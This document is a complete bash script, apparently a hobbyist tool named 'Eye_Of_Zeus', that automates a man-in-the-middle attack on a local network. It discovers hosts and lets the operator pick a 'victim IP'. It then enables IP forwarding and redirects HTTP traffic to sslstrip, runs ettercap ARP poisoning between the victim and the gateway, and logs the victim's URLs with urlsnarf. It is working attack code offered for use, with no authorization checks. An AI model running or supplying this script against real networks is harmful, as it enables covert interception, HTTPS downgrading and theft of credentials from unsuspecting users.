#!/bin/bash

# Eye_Of_Zeus Banner
echo -e "\e[1;36m"
echo " ██████████                                  ███████       ██████            ███████████                            "
echo "░░███░░░░░█                                ███░░░░░███    ███░░███          ░█░░░░░░███                             "
echo " ░███  █ ░  █████ ████  ██████            ███     ░░███  ░███ ░░░           ░     ███░    ██████  █████ ████  █████ "
echo " ░██████   ░░███ ░███  ███░░███          ░███      ░███ ███████                  ███     ███░░███░░███ ░███  ███░░  "
echo " ░███░░█    ░███ ░███ ░███████           ░███      ░███ ░░░███░                 ███     ░███████  ░███ ░███ ░░█████ "
echo " ░███ ░   █ ░███ ░███ ░███░░░            ░░███     ███    ░███                ████     █░███░░░   ░███ ░███  ░░░░███"
echo " ██████████ ░░███████ ░░██████  █████████ ░░░███████░     █████     █████████ ███████████░░██████  ░░████████ ██████ "
echo "░░░░░░░░░░   ░░░░░███  ░░░░░░  ░░░░░░░░░    ░░░░░░░     ░░░░░     ░░░░░░░░░ ░░░░░░░░░░░  ░░░░░░    ░░░░░░░░ ░░░░░░  "
echo "             ███ ░███                                                                                               "
echo "            ░░██████                                                                                                "
echo "             ░░░░░░                                                                                                 "
echo -e "\e[0m"
echo -e "\e[1;36m================================================================================\e[0m"
echo -e "\e[1;36m========================  Author: arch_nexus707  ================================\e[0m"
echo -e "\e[1;36m================================================================================\e[0m"

# Get the directory where the script is located
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
NETDISCOVER_FILE="$SCRIPT_DIR/netdiscover_output.txt"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "This script must be run as root. Please use: sudo $0"
    exit 1
fi

# Verify required tools are present before we start.
check_dependencies() {
    local deps=("netdiscover" "ip" "iptables" "xterm" "sslstrip" "ettercap" "urlsnarf" "timeout")
    local missing=()
    for dep in "${deps[@]}"; do
        command -v "$dep" &>/dev/null || missing+=("$dep")
    done
    if [ ${#missing[@]} -gt 0 ]; then
        echo "Missing required tools: ${missing[*]}"
        echo "Install them first, e.g.:"
        echo "  sudo apt-get install netdiscover iproute2 iptables xterm sslstrip ettercap-text-only dsniff"
        echo "(sslstrip is Python 2; on modern Kali use sslstrip2 or bettercap instead.)"
        exit 1
    fi
    # xterm needs a running X display; warn if headless.
    if [ -z "$DISPLAY" ]; then
        echo "Warning: no \$DISPLAY detected. xterm windows will fail over SSH/headless sessions."
    fi
}
check_dependencies

# Function to display available interfaces
show_interfaces() {
    echo "Available network interfaces:"
    # Match all non-loopback interfaces, including predictable names
    # (enp3s0, wlp2s0, wlan0, eth0, etc.).
    interfaces=($(ip -o link show | awk -F': ' '{print $2}' | sed 's/@.*//' | grep -vE '^(lo)$'))

    for i in "${!interfaces[@]}"; do
        echo "[$((i+1))] ${interfaces[$i]}"
    done
    
    if [ ${#interfaces[@]} -eq 0 ]; then
        echo "No eth or wlan interfaces found!"
        exit 1
    fi
}

# Function to perform network discovery
network_discovery() {
    echo "Starting network discovery on $selected_iface for 60 seconds..."
    
    # Run netdiscover in background for 60 seconds
    echo "Running netdiscover, please wait..."
    timeout 60 netdiscover -i "$selected_iface" -P -r "${network_cidr}" > "$NETDISCOVER_FILE" 2>&1
    
    # Check if netdiscover output file was created
    if [ ! -f "$NETDISCOVER_FILE" ]; then
        echo "Error: netdiscover output file not found at $NETDISCOVER_FILE"
        exit 1
    fi
    
    # Extract discovered IPs from netdiscover -P output: the IP is the first
    # column of each host row. Parsing columns (rather than grepping every
    # IP-shaped string) avoids picking up netmasks, counts, or our own address.
    discovered_ips=($(awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ {print $1}' "$NETDISCOVER_FILE" | sort -u | grep -v "^0.0.0.0$"))

    # Display discovered hosts
    echo "Discovered hosts on $selected_iface:"
    for i in "${!discovered_ips[@]}"; do
        # MAC address is the second column on the matching host row.
        mac=$(awk -v ip="${discovered_ips[$i]}" '$1 == ip {print $2; exit}' "$NETDISCOVER_FILE")
        echo "[$((i+1))] IP: ${discovered_ips[$i]}  MAC: $mac"
    done
    
    if [ ${#discovered_ips[@]} -eq 0 ]; then
        echo "No hosts discovered. Exiting."
        echo "Check the netdiscover output file at: $NETDISCOVER_FILE"
        exit 1
    fi
}

# Function to get gateway IP
get_gateway() {
    gateway_ip=$(ip route | grep default | grep "$selected_iface" | awk '{print $3}' | head -1)
    if [ -z "$gateway_ip" ]; then
        echo "Could not determine gateway IP. Please enter it manually:"
        read gateway_ip
    else
        echo "Detected gateway: $gateway_ip"
    fi
}

# Step 1: Enable IP forwarding
echo "Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "IP forwarding status: $(cat /proc/sys/net/ipv4/ip_forward)"
echo ""

# Step 2: Select interface
show_interfaces

echo "Please select an interface (1-${#interfaces[@]}):"
read iface_choice

if [[ ! $iface_choice =~ ^[0-9]+$ ]] || [ $iface_choice -lt 1 ] || [ $iface_choice -gt ${#interfaces[@]} ]; then
    echo "Invalid selection. Exiting."
    exit 1
fi

selected_iface=${interfaces[$((iface_choice-1))]}
echo "Selected interface: $selected_iface"

# Get network CIDR for scanning
network_cidr=$(ip -o -f inet addr show "$selected_iface" | awk '/scope global/ {print $4}' | head -1)
if [ -z "$network_cidr" ]; then
    echo "Could not determine network CIDR. Please enter it manually (e.g., 192.168.1.0/24):"
    read network_cidr
fi

# Step 3: Network discovery
network_discovery

# Step 4: Select victim IP
echo "Please select a victim IP (1-${#discovered_ips[@]}):"
read victim_choice

if [[ ! $victim_choice =~ ^[0-9]+$ ]] || [ $victim_choice -lt 1 ] || [ $victim_choice -gt ${#discovered_ips[@]} ]; then
    echo "Invalid selection. Exiting."
    exit 1
fi

victim_ip=${discovered_ips[$((victim_choice-1))]}
echo "Selected victim IP: $victim_ip"

# Step 5: Get gateway IP
get_gateway

# Step 6: Set up iptables rule
echo "Setting up iptables rule..."
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Step 7: Start sslstrip in a new terminal
echo "Starting sslstrip in a new terminal..."
xterm -T "SSLStrip" -e "echo 'SSLStrip running on port 8080'; echo '**********DO NOT CLOSE THIS TERMINAL**********'; sslstrip -l 8080" &

# Step 8: Start ettercap in a new terminal
echo "Starting ettercap in a new terminal..."
xterm -T "Ettercap" -e "echo 'Ettercap ARP poisoning between $victim_ip and $gateway_ip'; ettercap -Tq -M arp:remote -i $selected_iface /$victim_ip// /$gateway_ip//" &

# Brief pause to allow ARP poisoning to take effect
sleep 5

# Step 9: Start urlsnarf in a new terminal
echo "Starting urlsnarf in a new terminal..."
xterm -T "URLSnarf" -e "echo 'URLSnarf capturing traffic on $selected_iface'; urlsnarf -i $selected_iface" &

echo ""
echo "All tools have been launched in separate terminals."
echo "Netdiscover output saved to: $NETDISCOVER_FILE"
echo "Remember to close all terminals and flush iptables when done:"
echo "iptables -t nat -F"
